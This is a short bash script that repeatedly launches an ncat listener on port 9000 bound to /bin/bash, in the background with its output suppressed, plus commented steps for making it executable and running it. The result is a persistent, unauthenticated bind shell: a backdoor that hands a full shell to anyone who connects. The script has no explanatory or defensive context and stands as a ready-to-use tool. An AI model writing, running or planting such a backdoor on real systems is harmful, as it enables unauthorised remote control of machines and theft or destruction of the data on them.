#!/bin/bash

# listener_ip="your_listener_ip"
listener_port="9000"

while true; do
    nohup ncat -lvp "$listener_port" --exec "/bin/bash" > /dev/null 2>&1 &
    pid=$!
    wait $pid
done


# chmod +x auto-run.sh
# ./auto-run.sh
